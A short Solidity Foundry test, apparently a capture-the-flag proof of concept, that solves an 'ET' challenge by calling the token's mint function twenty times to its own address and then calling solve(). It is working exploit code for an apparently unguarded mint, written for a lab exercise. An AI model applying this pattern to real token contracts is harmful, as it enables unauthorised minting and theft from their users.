// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {ET,Challenge} from "src/ET.sol";

contract ET_POC is Test {
    ET _et;
    Challenge _challenge;
    function init() private{
        vm.startPrank(address(0x10));
        _challenge = new Challenge(address(this));
        _et = _challenge.et();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_ET_POC() public{
        for (uint256 i = 0; i < 20; i++) {
            _et.mint(address(this), i); 
        }
        _challenge.solve();
        console.log("Solved: ", _challenge.isSolved());
    }
        
}
